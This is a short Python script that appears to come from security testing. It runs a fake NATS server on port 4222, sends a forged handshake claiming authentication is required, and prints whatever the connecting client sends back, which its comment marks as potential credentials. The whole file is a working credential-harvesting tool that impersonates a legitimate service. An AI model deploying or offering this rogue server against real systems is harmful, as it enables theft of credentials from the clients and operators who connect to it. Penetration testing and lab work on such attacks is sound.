import socket

HOST = "0.0.0.0"
PORT = 4222
print(f"[+] Fake NATS Server listening on {HOST}:{PORT}")

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(5)

while True:
    try:
        client, addr = s.accept()
        print(f"[+] Connection from {addr}")
        
        # Send fake INFO – zwingend für NATS Client-Handshake
        info = b'INFO {"server_id":"FAKE","version":"2.11.0","auth_required":true}\r\n'
        client.sendall(info)
        
        # Read potential credentials
        data = client.recv(2048)
        print("[>] Received:")
        print(data.decode(errors='replace'))
        
        # Optional: Close connection or respond
        # client.sendall(b'-ERR "Authorization Violation"\r\n')
        client.close()
    except Exception as e:
        print(f"[!] Error: {e}")

